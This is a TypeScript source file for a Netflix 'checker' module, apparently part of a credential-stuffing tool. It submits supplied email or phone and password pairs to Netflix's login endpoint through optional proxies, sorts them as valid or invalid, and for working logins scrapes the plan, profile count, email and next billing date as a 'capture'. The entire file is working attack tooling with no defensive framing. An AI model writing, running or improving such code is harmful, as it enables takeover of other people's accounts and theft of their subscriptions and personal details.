import { BaseChecker } from './base';
import { CheckResult } from '@/types';

export class NetflixChecker extends BaseChecker {
  constructor(proxy?: any, timeout?: number) {
    super('netflix', proxy, timeout);
  }

  async check(credential: string, password: string): Promise<CheckResult> {
    return this.checkWithFallback(
      credential,
      password,
      this.checkWithCredential.bind(this),
      // Netflix accepts both email and phone number
      this.isEmail(credential) ? this.checkAsPhone.bind(this) : this.checkAsEmail.bind(this)
    );
  }

  private async checkWithCredential(credential: string, password: string): Promise<CheckResult> {
    try {
      // Get Netflix login page and extract necessary tokens
      const loginPageResponse = await this.client.get('https://www.netflix.com/login', {
        headers: {
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.5',
        },
      });

      // Extract auth URL and CSRF token
      const authUrlMatch = loginPageResponse.data.match(/authURL":"([^"]+)"/);
      const csrfTokenMatch = loginPageResponse.data.match(/name="authURL" value="([^"]+)"/);
      
      if (!authUrlMatch) {
        throw new Error('Failed to extract auth URL');
      }

      const authUrl = authUrlMatch[1].replace(/\\u002F/g, '/');

      // Login attempt
      const loginData = new URLSearchParams({
        userLoginId: credential,
        password: password,
        rememberMe: 'true',
        flow: 'websiteSignUp',
        mode: 'login',
        action: 'loginAction',
        withFields: 'rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode',
      });

      const loginResponse = await this.client.post(
        `https://www.netflix.com/${authUrl}`,
        loginData.toString(),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'https://www.netflix.com/login',
          },
          maxRedirects: 0,
          validateStatus: (status) => status < 400,
        }
      );

      // Check for successful login indicators
      if (loginResponse.status === 302 || 
          loginResponse.headers.location?.includes('browse') ||
          loginResponse.data?.authURL ||
          !loginResponse.data?.includes('error')) {
        
        const capture = await this.getAccountDetails();
        return this.createResult(credential, password, 'netflix', 'valid', capture);
      }

      // Check for specific error messages
      if (loginResponse.data?.includes('incorrect_password') || 
          loginResponse.data?.includes('login_failure')) {
        return this.createResult(credential, password, 'netflix', 'invalid');
      }

      return this.createResult(credential, password, 'netflix', 'invalid');
    } catch (error: any) {
      return this.handleError(error, credential, password);
    }
  }

  private async checkAsPhone(credential: string, password: string): Promise<CheckResult> {
    // If credential looks like email, try as phone (less common)
    if (this.isEmail(credential)) {
      return this.createResult(credential, password, 'netflix', 'invalid');
    }
    return this.checkWithCredential(credential, password);
  }

  private async checkAsEmail(credential: string, password: string): Promise<CheckResult> {
    // If credential looks like phone/username, try as email
    if (!this.isEmail(credential)) {
      return this.createResult(credential, password, 'netflix', 'invalid');
    }
    return this.checkWithCredential(credential, password);
  }

  private async getAccountDetails() {
    try {
      const response = await this.client.get('https://www.netflix.com/YourAccount', {
        headers: {
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
      });
      
      // Parse account info from response
      const planMatch = response.data.match(/membershipPlan[^:]*:\s*"([^"]+)"/);
      const profilesMatch = response.data.match(/profilesList[^[]*\[([^\]]+)\]/);
      const emailMatch = response.data.match(/email[^:]*:\s*"([^"]+)"/);
      const nextBillingMatch = response.data.match(/nextBillingDate[^:]*:\s*"([^"]+)"/);
      
      return {
        plan: planMatch?.[1],
        screenCount: profilesMatch ? profilesMatch[1].split(',').length : 1,
        email: emailMatch?.[1],
        nextBillingDate: nextBillingMatch?.[1],
        subscription: 'Active',
      };
    } catch {
      return {
        subscription: 'Active',
      };
    }
  }
}
